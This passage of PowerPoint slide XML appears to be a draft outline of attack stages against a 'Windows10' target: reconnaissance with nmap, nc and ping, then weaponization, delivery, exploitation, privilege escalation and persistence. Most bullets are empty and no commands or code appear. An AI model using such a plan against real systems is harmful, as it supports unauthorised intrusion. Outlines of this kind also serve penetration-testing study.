                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Portscan,IPscan</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Website(URL, </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Layout,mail</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> address)</a:t>
              </a:r>
              <a:br>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
              </a:br>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="グループ化 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E787FA3-C72F-4243-872B-1F8EB485D1E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1611564" y="3099560"/>
            <a:ext cx="4784299" cy="646541"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646541"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="四角形: 角を丸くする 25">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6104BA1F-5E5C-4D19-BDF5-8CB7A3A724F0}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491467" y="2402584"/>
              <a:ext cx="7780901" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="5" name="グループ化 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3A17D01-9D8D-468C-A143-12D4A7C06864}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671764" y="2520750"/>
              <a:ext cx="7763550" cy="528375"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="528375"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="31" name="四角形: 角を丸くする 30">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BD7D45A-C104-4B41-81DC-5F78001649AE}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671764" y="2520750"/>
                <a:ext cx="1967592" cy="444288"/>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1200" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Weaponization</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="27" name="テキスト ボックス 26">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{462A7246-78FD-462B-A575-9447FB11CF81}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4776110" y="2525905"/>
                <a:ext cx="5659204" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="グループ化 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{204AC1E6-E537-4172-A461-7ABD8230CC85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="1581447"/>
            <a:ext cx="4735755" cy="751726"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7863244" cy="751726"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="四角形: 角を丸くする 33">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ADC5810C-268B-4B77-AFB9-377D7E31E1FA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2472065" y="3278783"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="35" name="四角形: 角を丸くする 34">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A027BF5-CF9E-4D80-9DB7-E6C22C87E656}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2627194" y="3383918"/>
              <a:ext cx="1967592" cy="444288"/>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400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Exploitation</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="テキスト ボックス 28">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A607270-D263-4193-850D-B9016329C0C3}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4749915" y="3291845"/>
              <a:ext cx="5585394" cy="738664"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:br>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
              </a:br>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="テキスト ボックス 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67DC3C26-A69A-4D87-B44D-E707C0D4E273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11241317" y="5988824"/>
            <a:ext cx="584968" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="テキスト ボックス 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55732190-C9A7-4CFC-BA51-6E6A5EF8E2EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1708819" y="2201617"/>
            <a:ext cx="7460125" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ipscan:ping,nmap,nc</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="テキスト ボックス 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C705EF42-E8D0-488E-B0D4-DAD87043883E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1468545" y="116910"/>
            <a:ext cx="6873267" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>TARGET</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows10</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="40" name="グループ化 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F5F1FA9-31DB-458E-B9E7-CDDE1613C0AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="4660745"/>
            <a:ext cx="5026053" cy="646332"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41" name="四角形: 角を丸くする 40">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{330374DF-55CB-4607-AB91-EF703A5F6BBA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491462" y="4146186"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="42" name="グループ化 41">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5622D2E7-B74B-4299-802F-5B18CE535E4C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="523220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="43" name="四角形: 角を丸くする 42">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F620D5B7-F779-425B-9769-B3388581BCA1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671758" y="4254740"/>
                <a:ext cx="1967592" cy="444288"/>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400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Privilege escalation</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="44" name="テキスト ボックス 43">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E453680-4964-452E-8D8E-32868BDFD542}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4731540" y="4190002"/>
                <a:ext cx="6105176" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:r>
                  <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>P</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="50" name="グループ化 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA9BB01F-3B5A-4DCA-AE39-B3CF9EE2017C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="3123210"/>
            <a:ext cx="5026053" cy="646332"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="51" name="四角形: 角を丸くする 50">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DEA3846-88FF-44C9-BAD8-874F89766A60}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491462" y="4146186"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="52" name="グループ化 51">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE1F6F3B-51D6-4047-BC44-691D3727E5D9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="523220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="53" name="四角形: 角を丸くする 52">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00D6F48F-4C89-4566-8982-808F2B2E0B62}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671758" y="4254740"/>
                <a:ext cx="1967592" cy="444288"/>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200" dirty="0" err="1">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Persistentence</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="54" name="テキスト ボックス 53">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E0EDDF-D1E9-4B0F-9D37-E4674A7D6C2A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4731540" y="4190002"/>
                <a:ext cx="6105176" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="55" name="グループ化 54">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B356C850-D500-4B6F-934E-FDA708D157EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1632607" y="4654253"/>
            <a:ext cx="4784299" cy="646541"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646541"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="56" name="四角形: 角を丸くする 55">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F0DDF8C-470C-4F67-A05B-07709E02BA74}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491467" y="2402584"/>
              <a:ext cx="7780901" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="57" name="グループ化 56">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53168D32-9AF4-4E83-B7AC-00B85A44622D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671764" y="2520750"/>
              <a:ext cx="7763550" cy="528375"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="528375"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="58" name="四角形: 角を丸くする 57">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83F25E00-5139-4C54-B93F-4B5B0FB25CEC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671764" y="2520750"/>
                <a:ext cx="1967592" cy="444288"/>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1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Delivery</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="59" name="テキスト ボックス 58">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{912BF64E-8F53-40E3-8F37-3D9EA8F9AA1D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4776109" y="2525905"/>
                <a:ext cx="5659205" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
